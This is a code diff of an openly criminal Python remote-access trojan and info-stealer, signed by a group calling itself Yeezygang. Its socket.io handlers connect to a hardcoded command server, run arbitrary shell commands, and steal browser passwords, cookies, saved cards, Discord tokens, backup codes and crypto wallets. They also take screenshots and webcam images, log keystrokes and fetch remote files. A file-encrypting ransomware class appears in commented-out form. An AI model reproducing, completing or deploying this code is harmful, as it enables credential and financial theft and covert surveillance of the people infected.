@@ -4,24 +4,153 @@ import socketio, base64, os, socket, platform, requests, sqlite3, json, shutil, 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-
 sio = socketio.Client()
-
 wapned_path = os.getenv("temp") + "/"
-random_name = lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])
 appdata = os.getenv('LOCALAPPDATA')
 roaming = os.getenv("appdata")
 on = False
-
 '''
 PUBLIC CODE OF YEEZYGANG
-
 DEV: DIPRE
-
 YEEZYGANG MAKE MONEY
-
 YEEZYGANG ON TOP
 '''
+Obj = Grabb()
+on = False
+@sio.event
+def connect():
+    sio.emit('join', user_id)
+    print('Conectado al servidor')
+@sio.on('command')
+def command(cmd):
+    sio.emit('command-response', os.popen(cmd['cmd']).read())
+@sio.on('history')
+def history():
+    sio.emit('history-response', GrabbBrowsers().start('history'))
+@sio.on('discord-tokens')
+def tokens():
+    information['tokens']=[]
+    GetTokens().start()
+    time.sleep(5)
+    sio.emit('discord-tokens-response', information['tokens'])
+@sio.on('cards')
+def cards():
+    sio.emit('cards-response', GrabbBrowsers().start('cards'))
+@sio.on('passwords')
+def passwords():
+    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))
+@sio.on('download')
+def download(filename: str):
+    if os.path.exists(filename):
+        with open(filename, "rb") as f:
+            data = f.read()
+        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})
+    else:
+        sio.emit('download-response', False)
+@sio.on('backup-codes')
+def getBackupCodes():
+    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())
+@sio.on('cookies')
+def cookies():
+    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))
+@sio.on('browsers')
+def browsers():
+    GrabbBrowsers().start('all',)
+    sio.emit('browsers-response', information['browsers'])
+@sio.on('website')
+def website(url: str):
+    try:
+        webbrowser.open(url)
+        sio.emit('website-response', True)
+    except:
+        sio.emit('website-response', False)
+@sio.on('upload')
+def upload(args: dict):
+    try:
+        response = requests.get(args['url'])
+        if response.status_code == 200:
+            with open(args['path'], "wb") as f:
+                f.write(response.content)
+            sio.emit('upload-response', True)
+        else:
+            sio.emit('upload-response', False)
+    except Exception as e:
+        sio.emit('upload-response', False)
+@sio.on('alert')
+def upload(alert: str):
+    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()
+    sio.emit('alert-response', True)
+@sio.on('wallets')
+def wallets():
+    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))
+@sio.on('gamestores')
+def wallets():
+    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))
+@sio.on('screenshot')
+def screenshot():
+    with open(Obj.screenshot(), 'rb') as image_file:
+        image_data = image_file.read()
+        sio.emit('screenshot-response', image_data)
+@sio.on('webcam')
+def screenshot():
+    file = Obj.webcam()
+    with open(file, 'rb') as image_file:
+        image_data = image_file.read()
+        sio.emit('webcam-response', image_data)
+@sio.on('ip')
+def screenshot():
+    sio.emit('ip-response', requests.get('https://api.ipify.org').text)
+@sio.on('website')
+def screenshot(url: str):
+    sio.emit('website-response', webbrowser.open(url=url))
+@sio.on('encrypt')
+def encrypt(data):
+    file = data['path']
+    key = data['key']
+    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())
+@sio.on('decrypt')
+def decrypt(data):
+    file = data['path']
+    key = data['key']
+    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())
+@sio.on('information')
+def info():
+    sio.emit('information-response', Obj.getInformation())
+@sio.on('initkeylog')
+def info(data: bool):
+    global on
+    global keylogthread
+    if data:
+        if not on:
+            keylogthread = threading.Thread(target=KeyLogger().start).start()
+            sio.emit('initkeylog-response', True)
+        else:
+            sio.emit('initkeylog-response', 101)
+    else:
+        on = False
+        try:
+            keylogthread.join()
+        except:
+            pass
+        sio.emit('initkeylog-response', False)
+@sio.on('listdir')
+def listdir(path: str):
+    if os.path.exists(path):
+        sio.emit('listdir-response', {"path": path, "files":os.listdir(path)})
+    else:
+        sio.emit('listdir-response', False)
+@sio.event
+def disconnect():
+    pass
+api = "https://yeezy-api.onrender.com/"
+user_id = "1166039508446351390"
+define_(
+    user_id,
+    api,
+    True,
+)
+
+# lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])
 
 class Startup:
     def __init__(self) -> None:
@@ -255,7 +384,6 @@ class GrabbBrowsers:
 
         return content
 
-
 class GetTokens:
     def __init__(self):
         self.paths = {
@@ -342,14 +470,14 @@ class GetTokens:
                         for token in re.findall(self.regexp, line):
                             Token(token)
 
-class Token:
-    def __init__(self, token: str) -> None:
-        self.token = token
-        self.check()
-
-    def check(self) -> None:
-        if not self.token in information['tokens']:
-            information['tokens'].append(self.token)
+# class Token:
+#     def __init__(self, token: str) -> None:
+#         self.token = token
+#         self.check()
+#
+#     def check(self) -> None:
+#         if not self.token in information['tokens']:
+#             information['tokens'].append(self.token)
 
 class Grabb:
     def __init__(self) -> None:
@@ -393,6 +521,19 @@ class Grabb:
         cv2.imwrite(filename, frame)
         cap.release()
         return filename
+
+# def convertPathToZip(
+#         name: str,
+#         path: str
+#         ) -> None:
+#         if os.path.exists(path):
+#             zip_name = wapned_path + name.replace(" ", "") + ".zip"
+#             os.chdir(path)
+#             if len(os.listdir(path)) > 0:
+#                 with zipfile.ZipFile(zip_name, "w") as f:
+#                     for file in os.listdir(path):
+#                         f.write(file)
+#             return zip_name
 
 class FileMagnament:
     def __init__(
@@ -496,63 +637,59 @@ class FileMagnament:
             )
         return self.files
 
-class Encrypter:
-    def __init__(
-        self,
-        path: str,
-        key: str
-        ) -> None:
-        self.key = bytes(key, 'utf-8')
-        self.fernet = Fernet(self.key)
-        if os.path.isfile(path):
-            self.paths = [path]
-        if os.path.isdir(path):
-            self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]
-    
-    def encryptFiles(
-        self
-        ) -> None:
-        for file in self.paths:
-            if os.path.exists(file):
-                self.encrypt_file(file)
-        return True
+# class Encrypter:
+#     def __init__(
+#         self,
+#         path: str,
+#         key: str
+#         ) -> None:
+#         self.key = bytes(key, 'utf-8')
+#         self.fernet = Fernet(self.key)
+#         if os.path.isfile(path):
+#             self.paths = [path]
+#         if os.path.isdir(path):
+#             self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]
+#
+#     def encryptFiles(
+#         self
+#         ) -> None:
+#         for file in self.paths:
+#             if os.path.exists(file):
+#                 self.encrypt_file(file)
+#         return True
+#
+#     def decryptFiles(
+#         self
+#         ) -> None:
+#         for file in self.paths:
+#             if os.path.exists(file):
+#                 self.decrypt_file(file)
+#         return True
+#
+#     def encrypt_name(
+#         self,
+#         file: str
+#         ) -> None:
+#         os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + ".exe")
+#
+#     def encrypt_file(
+#         self, 
+#         file: str
+#         ) -> None:
+#         with open(file, 'rb') as f:
+#             e = self.fernet.encrypt(f.read())
+#         with open(file, 'wb') as f:
+#             f.write(e)
+#
+#     def decrypt_file(
+#         self, 
+#         file: str
+#         ) -> None:
+#         with open(file, 'rb') as f:
+#             e = self.fernet.decrypt(f.read())
+#         with open(file, 'wb') as f:
+#             f.write(e)
 
-    def decryptFiles(
-        self
-        ) -> None:
-        for file in self.paths:
-            if os.path.exists(file):
-                self.decrypt_file(file)
-        return True
-
-    def encrypt_name(
-        self,
-        file: str
-        ) -> None:
-        os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + ".exe")
-
-    def encrypt_file(
-        self, 
-        file: str
-        ) -> None:
-        with open(file, 'rb') as f:
-            e = self.fernet.encrypt(f.read())
-        with open(file, 'wb') as f:
-            f.write(e)
-
-    def decrypt_file(
-        self, 
-        file: str
-        ) -> None:
-        with open(file, 'rb') as f:
-            e = self.fernet.decrypt(f.read())
-        with open(file, 'wb') as f:
-            f.write(e)
-
-Obj = Grabb()
-
-
-on = False
 class KeyLogger:
     def __init__(
         self
@@ -589,156 +726,6 @@ class KeyLogger:
         ) -> None:
         sio.emit('keylog-response', self.data)
         self.data = []
-
-@sio.event
-def connect():
-    sio.emit('join', user_id)
-    print('Conectado al servidor')
-
-@sio.on('command')
-def command(cmd):
-    sio.emit('command-response', os.popen(cmd['cmd']).read())
-
-@sio.on('history')
-def history():
-    sio.emit('history-response', GrabbBrowsers().start('history'))
-
-@sio.on('discord-tokens')
-def tokens():
-    information['tokens']=[]
-    GetTokens().start()
-    time.sleep(5)
-    sio.emit('discord-tokens-response', information['tokens'])
-
-@sio.on('cards')
-def cards():
-    sio.emit('cards-response', GrabbBrowsers().start('cards'))
-
-@sio.on('passwords')
-def passwords():
-    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))
-
-@sio.on('download')
-def download(filename: str):
-    if os.path.exists(filename):
-        with open(filename, "rb") as f:
-            data = f.read()
-        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})
-    else:
-        sio.emit('download-response', False)
-
-@sio.on('backup-codes')
-def getBackupCodes():
-    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())
-
-@sio.on('cookies')
-def cookies():
-    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))
-
-@sio.on('browsers')
-def browsers():
-    GrabbBrowsers().start('all',)
-    sio.emit('browsers-response', information['browsers'])
-
-@sio.on('website')
-def website(url: str):
-    try:
-        webbrowser.open(url)
-        sio.emit('website-response', True)
-    except:
-        sio.emit('website-response', False)
-
-@sio.on('upload')
-def upload(args: dict):
-    try:
-        response = requests.get(args['url'])
-        if response.status_code == 200:
-            with open(args['path'], "wb") as f:
-                f.write(response.content)
-            sio.emit('upload-response', True)
-        else:
-            sio.emit('upload-response', False)
-    except Exception as e:
-        sio.emit('upload-response', False)
-
-@sio.on('alert')
-def upload(alert: str):
-    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()
-    sio.emit('alert-response', True)
-
-@sio.on('wallets')
-def wallets():
-    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))
-
-@sio.on('gamestores')
-def wallets():
-    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))
-
-@sio.on('screenshot')
-def screenshot():
-    with open(Obj.screenshot(), 'rb') as image_file:
-        image_data = image_file.read()
-        sio.emit('screenshot-response', image_data)
-
-@sio.on('webcam')
-def screenshot():
-    file = Obj.webcam()
-    with open(file, 'rb') as image_file:
-        image_data = image_file.read()
-        sio.emit('webcam-response', image_data)
-
-@sio.on('ip')
-def screenshot():
-    sio.emit('ip-response', requests.get('https://api.ipify.org').text)
-
-@sio.on('website')
-def screenshot(url: str):
-    sio.emit('website-response', webbrowser.open(url=url))
-
-@sio.on('encrypt')
-def encrypt(data):
-    file = data['path']
-    key = data['key']
-    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())
-
-@sio.on('decrypt')
-def decrypt(data):
-    file = data['path']
-    key = data['key']
-    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())
-
-@sio.on('information')
-def info():
-    sio.emit('information-response', Obj.getInformation())
-
-@sio.on('initkeylog')
-def info(data: bool):
-    global on
-    global keylogthread
-    if data:
-        if not on:
-            keylogthread = threading.Thread(target=KeyLogger().start).start()
-            sio.emit('initkeylog-response', True)
-        else:
-            sio.emit('initkeylog-response', 101)
-    else:
-        on = False
-        try:
-            keylogthread.join()
-        except:
-            pass
-        sio.emit('initkeylog-response', False)
-
-@sio.on('listdir')
-def listdir(path: str):
-    if os.path.exists(path):
-        sio.emit('listdir-response', {"path": path, "files":os.listdir(path)})
-    else:
-        sio.emit('listdir-response', False)
-
-@sio.event
-def disconnect():
-    pass
 
 def define_(
     id_: str,
@@ -784,12 +771,3 @@ def define_(
     except Exception as e:
         print(e)
     sio.disconnect()
-
-api = "https://yeezy-api.onrender.com/"
-user_id = "1166039508446351390"
-
-define_(
-    user_id,
-    api,
-    True,
-)
